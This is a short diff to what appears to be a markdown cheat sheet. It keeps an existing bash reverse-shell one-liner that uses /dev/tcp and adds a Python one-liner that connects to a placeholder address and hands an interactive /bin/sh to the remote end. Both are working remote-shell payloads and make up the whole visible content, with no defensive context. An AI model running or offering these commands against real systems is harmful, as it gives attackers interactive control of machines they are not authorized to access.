@@ -11,6 +11,12 @@
   ```bash
   bash -i >& /dev/tcp/${LOCAL_MACHINE_IP}/${PORT} 0>&1
   ```
+  or
+
+  ```bash
+  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR.IP.ADDR.HERE",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+  ```
+  
   
 <br/>
 
